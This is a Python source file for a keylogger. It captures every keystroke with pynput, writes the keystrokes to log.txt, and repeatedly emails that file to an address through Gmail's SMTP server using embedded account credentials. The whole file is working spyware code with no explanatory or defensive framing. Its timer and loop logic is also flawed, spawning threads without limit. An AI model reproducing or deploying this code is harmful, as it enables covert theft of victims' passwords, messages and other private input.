import pynput.keyboard
import smtplib,threading,time,os
from email.message import EmailMessage



class KeyLogger():
    def __init__(self,email,password):
        self.interval = 10
        self.email = email
        self.password = password

    def log_file(self,key):
        keyData = str(key)
        keyData = keyData.replace("'","")

        if keyData== "Key.space":
            keyData = ' '
        elif keyData == "Key.enter":
            keyData = "\n"
        elif keyData == "Key.backspace":
            keyData = " (backspace pressed) "
        elif keyData == "Key.shift":
            keyData = " (Left Shift Key pressed) "
        elif keyData == "Key.shift_r":
            keyData = " (Right Shift Key pressed) "
        elif keyData == "Key.ctrl_l":
            keyData = " (Left Crtl Key) "
        elif keyData == "Key.ctrl_r":
            keyData = " (Right Crtl Key) "
        elif keyData == "Key.alt_l":
            keyData = " (Left Alt Key) "
        elif keyData == "Key.cmd":
            keyData = " (Windows Key) "  
        elif keyData == "Key.caps_lock":
            keyData = " (Caps Lock Key) "

        with open("log.txt", "a") as f:
            f.write(keyData)


    def file_report(self):
        time = threading.Timer(self.interval, self.send_mail)
        time.start()
        try:
            with open('log.txt', 'rb') as f:
                file_data = f.read()
                file_name = f.name
            self.msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
        except FileNotFoundError:
            print("File does not exist right now.")


    def send_mail(self):
        self.msg = EmailMessage()
        self.msg['Subject'] = "Ye to nya subject hai"
        self.msg['From'] = self.email
        self.msg['To'] = self.email
        self.msg.set_content("Your file is here.")


        while True:
            time.sleep(10)
            self.file_report()
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(self.email, self.password)
                smtp.send_message(self.msg)
            print("Email Sent.")


    def start(self):
        with pynput.keyboard.Listener(on_press = self.log_file) as key_strikes:
            self.send_mail()
            key_strikes.join()



